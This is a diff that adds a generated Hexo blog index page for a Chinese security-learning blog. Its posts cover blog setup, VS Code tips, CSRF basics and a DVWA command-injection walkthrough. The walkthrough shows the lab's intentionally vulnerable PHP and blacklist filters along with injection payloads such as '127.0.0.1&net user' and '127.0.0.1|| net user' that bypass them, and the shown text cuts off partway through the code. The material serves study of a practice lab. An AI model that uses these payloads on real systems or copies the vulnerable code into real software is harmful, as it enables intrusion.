@@ -1,23 +1,2320 @@
-{% extends '_layout.swig' %}
-{% import '_macro/post.swig' as post_template %}
-{% import '_macro/sidebar.swig' as sidebar_template %}
+<!DOCTYPE html>
 
-{% block title %}{{ config.title }}{% if theme.index_with_subtitle and config.subtitle %} - {{config.subtitle }}{% endif %}{% endblock %}
 
-{% block page_class %}
-  {% if is_home() %}page-home{% endif -%}
-{% endblock %}
 
-{% block content %}
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="这是一个学习博客">
+<meta property="og:type" content="website">
+<meta property="og:title" content="yzklov">
+<meta property="og:url" content="http://example.com/index.html">
+<meta property="og:site_name" content="yzklov">
+<meta property="og:description" content="这是一个学习博客">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="yzklov">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Pisces',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/"/>
+
+
+
+
+
+  <title>yzklov</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left 
+  page-home">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">yzklov</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">做自己就好了</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="Searching..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
   <section id="posts" class="posts-expand">
-    {% for post in page.posts %}
-      {{ post_template.render(post, true) }}
-    {% endfor %}
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/hexo-github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yzklov">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/hexo-github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA.html" itemprop="url">hexo+github博客搭建</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2023-07-08T19:41:05+08:00">
+                2023-07-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/hello-world.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yzklov">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/hello-world.html" itemprop="url">Hello World</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2023-07-08T19:28:41+08:00">
+                2023-07-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yzklov">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html" itemprop="url">渗透测试</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2023-06-06T00:05:24+08:00">
+                2023-06-06
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>1、安装windows操作系统的虚拟机当作靶机</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/html.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yzklov">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/html.html" itemprop="url">html</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2023-06-04T16:14:23+08:00">
+                2023-06-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p><strong>关于html常用的vscode插件</strong><br>1、Auto Rename Tag:双击html的标签并修改会前后一起改变<br>2、One Dark Pro:一款颜色主题<br>3、系统自带格式化：设置-&gt;文本编辑器-&gt;格式化-&gt;勾上format on paste和format on save<br>4、open in browser ：可以在浏览器中显示页面<br>右键选择open in default browser在默认浏览器打开<br>5、Live Server(推荐) ： 实时预览，但首先需要打开一个文件夹<br>右键选择open in Live Server，也是在浏览器中打开但和上面不同的是内容会随代码的改变而实时变化<br>6、Easy LESS ： 我们写的less不能直接引入到html文件中，通过这个插件可以自动帮我们生成css文件<br>7、会了吧 ： 英文翻译，点击左侧的会<br>8、vscode-icons 图标修改</p>
+<p><strong>vscode常用快捷键</strong></p>
+<ul>
+<li>ctrl + -&#x2F;+ ：缩小放大代码</li>
+<li>shift + alt + 下键 ： 选中某行并复制到下一行</li>
+<li>ctrl + d ：先双击选定一个单词，然后按下ctrl+d可以往下依次选择相同的单词，这样同时修改相同的单词就非常方便</li>
+<li>ctrl + alt+  上或下：添加多个光标，可以同时添加内容</li>
+<li>ctrl + h：全局查找替换某个单词</li>
+<li>ctrl + g：跳转到某行</li>
+<li>shift + alt 然后拖动鼠标选中一个区块，可以一起删除</li>
+<li>ctrl + &#x2F; ：单行注释</li>
+<li>自定义快捷键：左下角管理-&gt;键盘快捷方式，查找shift + alt + a(原本的多行注释快捷键)，点击修改，直接按键修改，回车就修改成功，那么多行注释就变成ctrl + shift + &#x2F;</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/CSRF.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yzklov">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/CSRF.html" itemprop="url">CSRF</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2023-06-01T15:44:07+08:00">
+                2023-06-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="什么是CSRF？"><a href="#什么是CSRF？" class="headerlink" title="什么是CSRF？"></a>什么是CSRF？</h2><blockquote>
+<p>跨站请求伪造，冒用Cookie中的信息，发起请求攻击。<br>CSRF（Cross-site request forgery）跨站请求伪造：攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获取的注册凭证，绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的。</p>
+</blockquote>
+<h2 id="CSRF攻击过程"><a href="#CSRF攻击过程" class="headerlink" title="CSRF攻击过程"></a>CSRF攻击过程</h2><p>1、当用户已经登录成功了一个网站<br>2、然后通过被诱导进了第三方网站「钓鱼网站」<br>3、跳转过去了自动提交表单，冒用受害者信息<br>4、后台则正常走逻辑将用户提交的表单信息进行处理</p>
+<h2 id="CSRF的特点"><a href="#CSRF的特点" class="headerlink" title="CSRF的特点"></a>CSRF的特点</h2><p>攻击一般发起在第三方网站，而不是被攻击的网站。被攻击的网站无法防止攻击发生。 攻击利用受害者在被攻击网站的登录凭证，冒充受害者提交操作；而不是直接窃取数据，整个过程攻击者并不能获取到受害者的登录凭证，仅仅是“冒用”。 跨站请求可以用各种方式：图片URL、超链接、CORS、Form提交等等。部分请求方式可以直接嵌入在第三方论坛、文章中，难以进行追踪。 CSRF通常是跨域的，因为外域通常更容易被攻击者掌控。但是如果本域下有容易被利用的功能，比如可以发图和链接的论坛和评论区，攻击可以直接在本域下进行，而且这种攻击更加危险。</p>
+<h2 id="防护策略"><a href="#防护策略" class="headerlink" title="防护策略"></a>防护策略</h2><p>CSRF通常从第三方网站发起，被攻击的网站无法防止攻击发生，只能通过增强自己网站针对CSRF的防护能力来提升安全性。</p>
+<p><strong>Token：存在本地local strage中的加密数据</strong><br>token是一个比较有效的CSRF防护方法，只要页面没有XSS漏洞泄露Token，那么接口的CSRF攻击就无法成功，也是现在主流的解决方案。</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/dvwa.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yzklov">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/dvwa.html" itemprop="url">dvwa</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2023-05-31T23:05:45+08:00">
+                2023-05-31
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="暴力破解-Brute-Force"><a href="#暴力破解-Brute-Force" class="headerlink" title="暴力破解(Brute Force)"></a>暴力破解(Brute Force)</h2><p>暴力破解或称为穷举法，是一种针对于密码的破译方法，即将密码进行逐个推算直到找出真正的密码为止<br><img src="/./img/163.png"></p>
+<h2 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h2><h3 id="low"><a href="#low" class="headerlink" title="low"></a>low</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Submit&#x27; ]  ) ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $target = $_REQUEST[ &#x27;ip&#x27; ];</span><br><span class="line"></span><br><span class="line">    // 确定操作系统并执行ping命令</span><br><span class="line">    if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123;</span><br><span class="line">        // 判断函数的返回值有没有Windows</span><br><span class="line">        $cmd = shell_exec( &#x27;ping  &#x27; . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // *nix</span><br><span class="line">        $cmd = shell_exec( &#x27;ping  -c 4 &#x27; . $target );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Feedback for the end user</span><br><span class="line">    echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+<ul>
+<li>php_uname()会返回操作系统的一些相关信息，其中就包括操作系统的名称，之后带入到stristr()函数查找windows NT，如果有就会返回字符串的剩余部分（从匹配点）。如果未找到所搜索的字符串，则返回 FALSE</li>
+<li>shell_exec() — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回<br>可以直接进行命令注入：<br><code>127.0.0.1&amp;ipconfig</code><br><code>127.0.0.1&amp;net user</code><br><code>127.0.0.1&amp;systeminfo</code><br><code>127.0.0.1&amp;dir</code><br>当然也可以使用管道符|,|的输出只有后面指令的，因为|的含义是将前面命令的标准输出作为后面命令的标准输入</li>
+</ul>
+<h3 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Submit&#x27; ]  ) ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $target = $_REQUEST[ &#x27;ip&#x27; ];</span><br><span class="line"></span><br><span class="line">    // Set blacklist</span><br><span class="line">    $substitutions = array(</span><br><span class="line">        &#x27;&amp;&amp;&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;;&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    // Remove any of the charactars in the array (blacklist).</span><br><span class="line">    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br><span class="line"></span><br><span class="line">    // Determine OS and execute the ping command.</span><br><span class="line">    if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123;</span><br><span class="line">        // Windows</span><br><span class="line">        $cmd = shell_exec( &#x27;ping  &#x27; . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // *nix</span><br><span class="line">        $cmd = shell_exec( &#x27;ping  -c 4 &#x27; . $target );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Feedback for the end user</span><br><span class="line">    echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>array_keys() 函数返回包含数组中所有键名的一个新数组<br>eg:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$substitutions = array(&#x27;&amp;&amp;&#x27; =&gt; &#x27;&#x27;,&#x27;;&#x27;  =&gt; &#x27;&#x27;,);</span><br><span class="line">print_r(array_keys( $substitutions ));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+输出：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; &amp;&amp;</span><br><span class="line">    [1] =&gt; ;</span><br><span class="line">)</span><br></pre></td></tr></table></figure></li>
+<li>str_replace():array_keys( $substitutions )规定查找的字符；$substitutions是规定查找到后要替换成的值；$target是目标字符串<br>下面的代码后low一样，所以可以使用&amp;来拼接也可以这样绕过：<code>127.0.0.1 &amp;;&amp; ipconfig</code></li>
+</ul>
+<h3 id="high"><a href="#high" class="headerlink" title="high"></a>high</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$substitutions = array(</span><br><span class="line">        &#x27;&amp;&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;;&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;| &#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;-&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;$&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;(&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;)&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;`&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;||&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">    ); </span><br></pre></td></tr></table></figure>
+<p>和medium的差别就是黑名单过滤变多了，其中最后一个存在空格，所以可以使用<code>127.0.0.1|| net user</code></p>
+<h3 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Submit&#x27; ]  ) ) &#123;</span><br><span class="line">    // Check Anti-CSRF token</span><br><span class="line">    checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; );</span><br><span class="line"></span><br><span class="line">    // Get input</span><br><span class="line">    $target = $_REQUEST[ &#x27;ip&#x27; ];</span><br><span class="line">    $target = stripslashes( $target );</span><br><span class="line"></span><br><span class="line">    // 将ip分成4个八位字节</span><br><span class="line">    $octet = explode( &quot;.&quot;, $target );</span><br><span class="line"></span><br><span class="line">    // Check IF each octet is an integer</span><br><span class="line">    if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) 